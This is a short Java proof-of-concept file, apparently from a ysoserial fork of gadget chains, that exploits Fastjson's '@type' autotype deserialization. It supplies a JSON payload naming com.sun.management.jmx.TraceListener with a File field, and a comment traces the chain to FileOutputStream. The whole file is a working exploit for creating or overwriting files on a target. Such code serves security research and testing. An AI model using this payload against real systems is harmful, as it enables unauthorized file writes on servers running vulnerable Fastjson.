package ysoserial.payloads.tabbyGadgetChains.Jdk8;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.alibaba.fastjson.serializer.SerializerFeature;
import org.springframework.aop.target.PrototypeTargetSource;
import ysoserial.payloads.util.Reflections;

import java.io.File;
import java.lang.reflect.Constructor;

/**
 * parseObject:197, JSON (com.alibaba.fastjson)
 * setFile:145, TraceListener (com.sun.management.jmx)
 * <init>:133, FileOutputStream (java.io)
 */

public class Poc2 {
    public static void main(String[] args) throws Exception {
        String poc = "{\"@type\":\"com.sun.management.jmx.TraceListener\",\"File\":\"/tmp/test\"}";
        System.out.println(poc);
        JSON.parseObject(poc, Feature.SupportNonPublicField);
    }
}
